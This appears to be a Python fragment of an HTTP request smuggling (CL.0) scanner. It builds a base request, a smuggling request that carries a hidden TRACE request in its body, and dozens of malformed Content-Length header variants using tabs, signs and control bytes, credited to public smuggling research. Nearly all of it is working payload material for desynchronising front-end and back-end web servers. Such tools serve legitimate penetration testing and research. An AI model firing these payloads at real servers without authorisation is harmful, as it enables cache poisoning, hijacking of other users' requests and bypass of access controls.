clzero_headers = {}

#This is the request we will use for base and probe requests.
regular_request = "GET __PATH__?__CACHE_BUSTER__=1 HTTP/1.1\r\n"
regular_request += "Host: __HOST__\r\n"
regular_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
regular_request += "Connection: Close\r\n\r\n"

#Define your request below that will smuggle our request. The smuggled request can be seen in the body, change as needed
smuggle_request = "__METHOD__ __PATH__ HTTP/1.1\r\n" #METHOD is defined by the -m argument
smuggle_request += "Host: __HOST__\r\n" # HOST yaknow
smuggle_request += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0\r\n"
smuggle_request += "Connection: Keep-Alive\r\n"
smuggle_request += "__MOD_CL__\r\n"#Our line where our sneaky modified Content-Length will be placed, see clzero_headers{}
smuggle_request += "\r\n"
smuggle_request_body = "TRACE /DJDHEC.txt HTTP/1.1\r\n" #No ways this returns 200 if smuggled
smuggle_request_body += "XHEADER: " #Next requests header should start here...


#Most payloads from https://github.com/defparam/smuggler thank you @defparam
#Also from https://portswigger.net/research/how-to-turn-security-research-into-profit thank you @albinowax
clzero_headers["nameprefix1"] = " Content-Length: __CL__"
clzero_headers["tabprefix1"] = "Content-Length:\t__CL__"
clzero_headers["tabprefix2"] = "Content-Length\t:\t__CL__"
clzero_headers["tabprefix3"] = "\tContent-Length: __CL__"
clzero_headers["space_1"] = "Content-Length : __CL__"
clzero_headers["positive"] = "Content-Length: +__CL__"
clzero_headers["negative"] = "Content-Length: -__CL__"
clzero_headers["comma_sep"] = "Content-Length: __CL__, 0"
clzero_headers["floating"] = "Content-Length: __CL__.0"
clzero_headers["normalize"] = "Content-Length: __CL__aa"
clzero_headers["subtract"] = "Content-Length: __CL__-0"

#Loop through a lot of funky ascii
for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
	clzero_headers["midspace-%02x"%i] = "Content-Length:%c__CL__"%(i)
	clzero_headers["postspace-%02x"%i] = "Content-Length%c: __CL__"%(i)
	clzero_headers["prespace-%02x"%i] = "%cContent-Length: __CL__"%(i)
	clzero_headers["endspace-%02x"%i] = "Content-Length: __CL__%c"%(i)
	clzero_headers["xprespace-%02x"%i] = "X: X%cContent-Length: __CL__"%(i)
	clzero_headers["endspacex-%02x"%i] = "Content-Length: __CL__%cX: X"%(i)
	clzero_headers["rxprespace-%02x"%i] = "X: X\r%cContent-Length: __CL__"%(i)
	clzero_headers["xnprespace-%02x"%i] = "X: X%c\nContent-Length: __CL__"%(i)
	clzero_headers["endspacerx-%02x"%i] = "Content-Length: __CL__\r%cX: X"%(i)
	clzero_headers["endspacexn-%02x"%i] = "Content-Length: __CL__%c\nX: X"%(i)
	
